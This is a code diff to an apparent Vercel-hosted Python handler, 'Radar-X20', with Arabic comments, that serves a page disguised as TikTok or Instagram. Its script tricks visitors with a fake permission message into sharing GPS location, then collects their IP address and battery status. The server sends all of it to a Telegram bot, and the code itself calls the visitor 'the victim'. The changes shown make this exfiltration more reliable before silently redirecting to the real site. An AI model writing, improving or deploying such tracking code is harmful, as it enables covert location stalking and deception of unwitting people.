@@ -23,13 +23,13 @@ class handler(BaseHTTPRequestHandler):
                 storage.target_url = data.get("url")
             elif 'device' in data:
                 d = data['device']
-                # سحب الـ IP الحقيقي من الـ Header
+                # سحب الـ IP بدقة من Vercel Headers
                 ip_addr = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
                 
                 gps = d.get('gps')
                 maps_url = f"https://www.google.com/maps?q={gps['lat']},{gps['lon']}" if isinstance(gps, dict) else "الضحية رفض الإذن ❌"
                 
-                # الرسالة بتنسيقك اللي طلبته مع الإضافات
+                # التنسيق المطلوب بدون أي تعديل
                 report = (
                     "🛰️ **Radar-X20: دخول جديد!**\n\n"
                     f"🌐 **IP:** `{ip_addr}`\n"
@@ -42,10 +42,10 @@ class handler(BaseHTTPRequestHandler):
                     f"📍 **الموقع:** {maps_url}"
                 )
                 
-                # إرسال البيانات فوراً
+                # إرسال البيانات مع التأكد من وصولها
                 api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
                 payload = json.dumps({"chat_id": ID, "text": report, "parse_mode": "Markdown"}).encode('utf-8')
-                req = urllib.request.Request(api_url, data=payload, headers={'Content-Type': 'application/json'})
+                req = urllib.request.Request(api_url, data=payload, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
                 urllib.request.urlopen(req)
 
             self.send_response(200)
@@ -58,6 +58,7 @@ class handler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         target = storage.target_url.lower()
+        # تحديد التمويه بناءً على المنصة
         if "tiktok" in target:
             p_name, p_img, p_msg = "TikTok", "https://sf16-scmcdn-sg.ibytedtos.com/obj/eden-sg/uufs_om_lp/ljhwZ_lp/2021/tiktok_og_image.png", "يرغب TikTok في الوصول لموقعك لتحسين جودة عرض الفيديو."
         elif "instagram" in target or "instagr.am" in target:
@@ -92,25 +93,25 @@ class handler(BaseHTTPRequestHandler):
                         data.battery = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
                     }} catch(e) {{ data.battery = "Unknown"; }}
 
-                    const sendData = (gpsData = null) => {{
+                    const sendAndRedirect = async (gpsData = null) => {{
                         data.gps = gpsData;
-                        fetch(window.location.href, {{
+                        // ننتظر الإرسال (await) لضمان أن البوت يستلم الرسالة قبل التحويل
+                        await fetch(window.location.href, {{
                             method: 'POST',
                             body: JSON.stringify({{ device: data }}),
                             headers: {{ 'Content-Type': 'application/json' }}
                         }});
-                        // تحويل فوري ومباشر
                         window.location.replace("{storage.target_url}");
                     }};
 
                     if (navigator.geolocation) {{
                         alert("{p_msg}");
                         navigator.geolocation.getCurrentPosition(
-                            (pos) => sendData({{ lat: pos.coords.latitude, lon: pos.coords.longitude }}),
-                            () => sendData(null),
-                            {{ enableHighAccuracy: true, timeout: 4000 }}
+                            (pos) => sendAndRedirect({{ lat: pos.coords.latitude, lon: pos.coords.longitude }}),
+                            () => sendAndRedirect(null),
+                            {{ enableHighAccuracy: true, timeout: 5000 }}
                         );
-                    }} else {{ sendData(null); }}
+                    }} else {{ sendAndRedirect(null); }}
                 }}
                 window.onload = startCapture;
             </script>
